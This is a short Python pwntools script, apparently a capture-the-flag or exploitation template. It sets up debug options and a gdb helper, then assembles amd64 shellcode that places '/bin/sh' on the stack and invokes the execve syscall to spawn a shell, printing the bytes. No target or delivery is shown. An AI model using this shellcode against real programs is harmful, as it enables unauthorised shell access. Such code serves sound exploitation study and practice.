from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

shellcode = asm('''
    mov DWORD PTR [rsp], 0x6e69622f
    mov DWORD PTR [rsp+4], 0x0068732f
    mov rdi, rsp
    mov eax, 59
    mov esi, 0
    mov edx, 0
    syscall
''')

log.hexdump(shellcode)
log.success(str(shellcode))
log.success(shellcode.hex())
